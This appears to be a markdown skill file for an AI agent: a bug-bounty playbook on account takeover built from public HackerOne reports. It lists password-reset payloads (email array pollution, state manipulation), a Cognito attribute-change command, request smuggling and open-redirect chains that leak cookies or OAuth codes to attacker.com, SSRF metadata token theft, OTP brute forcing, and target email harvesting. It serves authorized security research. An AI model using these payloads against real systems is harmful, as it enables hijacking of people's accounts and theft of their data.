---
name: accounttakeover
description: "Master-level playbook for ATO: session hijacking, password reset flaws, and OAuth/SAML misconfigurations."
---

# Account Takeover (ATO) Hunting

Expert playbook for identifying, bypassing, and escalating Account Takeover vulnerabilities based on top-tier HackerOne findings ($10k+ payouts).

## 1. Core Patterns
*   **JSON Parameter Pollution in Password Reset (GitLab #2293343 - $35,000):**
    *   **Architectural Cause:** Backend processing logic that accepts arrays for email fields in JSON requests, sending reset links to all addresses in the array.
    *   **Endpoint:** `/users/password`
    *   **Payload:** `{"user": {"email": ["victim@example.com", "attacker@example.com"]}}`
*   **Workflow State Manipulation (Uber #143717 - $10,000+):**
    *   **Architectural Cause:** Trusting a client-supplied `state` or `workflow` parameter to determine the next step in a signup/login flow without validating previous step completion.
    *   **Endpoint:** `/rt/users/passwordless-signup`
    *   **Payload:** `{"phoneNumberE164": "+1234567890", "userWorkflow": "PASSWORDLESS_SIGNUP", "state": "CREATE_NEW_PASSWORD", "newPasswordData": {"newPassword": "pw"}}`
*   **JWT Leakage via Forced Error (Remitly #2831902):**
    *   **Architectural Cause:** Including sensitive state tokens in error responses or CAPTCHA initialization payloads when an API is forced into an error state.
    *   **Endpoint:** `/orchestrator/v1/password_reset/start`
    *   **Payload:** Send a malformed CAPTCHA token to `/mfa/start` to trigger a response containing the victim's `state_token`.
*   **HTTP Request Smuggling to Cookie Theft (Slack #737140):**
    *   **Architectural Cause:** Desynchronization between frontend and backend parsers (CL.TE) allowing an attacker to prepend a request that forces an open redirect.
    *   **Endpoint:** `https://target.com/`
    *   **Payload:** Smuggling a `GET https://attacker.com/` request to capture the victim's session cookie in the `Referer` or via an open redirect.
*   **AWS Cognito Attribute Misconfiguration (Flickr #1342088):**
    *   **Architectural Cause:** Allowing users to update their email attribute via Cognito API without re-verification, combined with case-insensitive login normalization.
    *   **Endpoint:** `cognito-idp.[REGION].amazonaws.com`
    *   **Payload:** `aws cognito-idp update-user-attributes --access-token [TOKEN] --user-attributes Name=email,Value=Victim@Example.com`

## 2. Recon Checklist
*   **JS File Targets:** Search for `recovery`, `reset`, `mfa`, `otp`, `cognito`, `auth0`, `firebase`, `signup_workflow`.
*   **Parameter Names:** `email[]`, `state`, `step`, `workflow`, `redirect_url`, `callback`, `token`, `otp`, `code`.
*   **Hidden Endpoint Discovery:** Check for `/api/v1/auth/recovery/start`, `/api/v2/passwordless/verify`, `/.well-known/openid-configuration`.
*   **Burp Extensions:** 
    *   **HTTP Request Smuggler:** Critical for finding desync ATOs.
    *   **JWT Editor:** For testing signature bypasses or claim manipulation.
*   **ID Enumeration Types:** Check if `user_id` can be swapped in password reset requests or if `phone_number` normalization allows bypassing rate limits.

## 3. ID/Target Discovery
*   **Social Media/Search Engines:** Harvest emails and phone numbers of target employees or users.
*   **Public Report Leakage (HackerOne #745324):** Search public bug reports, forums, or code snippets for accidentally included `Cookie` or `Authorization` headers.
*   **Internal Service Discovery:** Use SSRF to reach internal metadata services and steal service account tokens (Autodesk #3024673).

## 4. Bypass Techniques
*   **Email Array Pollution (#2293343):** Convert `email=target` to `email[]=target&email[]=attacker` or `{"email": ["target", "attacker"]}`.
*   **SSO Enforcement Bypass (#976603):** Use an `entityId` with a trailing space `target_id ` to collide with existing configs and provision malicious users.
*   **Case Normalization (#1342088):** Register with `vIcTiM@target.com` if the system normalizes to `victim@target.com` during login but treats them as distinct during registration.
*   **Origin/Referer Spoofing (#129873):** Bypass origin validation in Digits/OAuth by using allowed subdomains or open redirects on trusted origins.
*   **State Token Replay (#1817214):** Attempt to use a password reset token multiple times or after the email has already been confirmed.
*   **Method Juggling:** Change `POST` reset requests to `GET` to see if tokens are leaked in logs or if verification is skipped.

## 5. High-Value Targets
1.  **Password Reset/Recovery Flow:** The #1 vector for interaction-less ATO.
2.  **OAuth/SAML SSO Configurations:** Leads to mass ATO and organization hijacking (Superhuman #976603).
3.  **Passwordless Signup/Login (OTP):** High risk of logic bypasses and rate limit failures (Uber #143717).
4.  **Linked Account Integrations (Google/FB/GitHub):** Vulnerable to CSRF and token theft (Rockstar #463330, Vercel #541701).
5.  **Administrative/Staff Portals:** ATO here leads to full system compromise (Uber #1883806).

## 6. Chaining Playbook
*   **XSS + Cookie Manipulation → ATO (Superhuman #534450):** Use XSS to set a malicious cookie that forces the victim into an attacker-controlled session.
*   **SSRF + Metadata Leak → ATO (Autodesk #3024673):** Access cloud metadata via SSRF to steal credentials for the auth provider (e.g., Cognito).
*   **Open Redirect + OAuth → ATO (Uber #206591):** Leak the OAuth `code` or `token` to an attacker's server via an open redirect on the `redirect_uri`.
*   **CSRF + Account Linking → ATO (Rockstar #463330):** Force a victim to link their account to an attacker-controlled social media account.

## 7. Variant-Specific: Password Reset Logic Bypasses
The "Holy Grail" of ATO is a 0-click password reset.
*   **The Flaw:** Often occurs when the "Token Generation" and "Token Verification" steps are decoupled incorrectly.
*   **Pattern 1:** Backend generates the token but leaks it in the response to the user's browser (Remitly #2831902).
*   **Pattern 2:** Host Header Injection - The reset email is sent, but the link points to `attacker.com` because the `Host` header was manipulated during the request (Enjin #1623672).
*   **Pattern 3:** Token Predictability - Sequential or time-based tokens that can be brute-forced (Instacart #271533).

## 8. Automation
*   **Burp Intruder:** Brute force OTPs or short reset tokens. Use the "Resource Pool" to manage rate limits.
*   **ffuf:** Fuzz for hidden auth endpoints or parameter names:
    `ffuf -u https://target/reset -d "FUZZ=target@email.com" -w auth_params.txt`
*   **Response Diffing:** Look for changes in `Set-Cookie` headers or `302 Redirect` locations when attempting different steps in a workflow.

## 9. Triage
*   **Critical ($15k+):** 0-click mass ATO, Password Reset Bypass, or SSO Hijacking (GitLab #2293343, Superhuman #976603).
*   **High ($5k-$12k):** 1-click ATO via OAuth/XSS, Account Recovery Bypass (TikTok #2443228).
*   **Medium ($1k-$4k):** ATO requiring significant user interaction or social engineering.
*   **Low ($200-$800):** ATO on non-sensitive subdomains or requiring local access.

## 10. Report Template
```markdown
## Summary
A critical Account Takeover (ATO) vulnerability was discovered in the `[FLOW - e.g., Password Reset]` flow. An attacker can [IMPACT - e.g., reset any user's password without interaction] by leveraging [VULNERABILITY - e.g., JSON parameter pollution].

## Steps to Reproduce
1. Initiate a password reset for `victim@example.com` at `[URL]`.
2. Intercept the request and modify the payload to: `[PAYLOAD]`.
3. Check the attacker's email for the reset link intended for the victim.
4. Use the link to set a new password and log in to the victim's account.

## Supporting Evidence
- **Target Endpoint:** `[ENDPOINT]`
- **Payload:** `[PAYLOAD]`
- **HackerOne Reference:** Based on patterns in Report #[ID] (e.g., #2293343)

## Impact
[Detailed impact: Full access to victim accounts, PII, and sensitive data.]
```
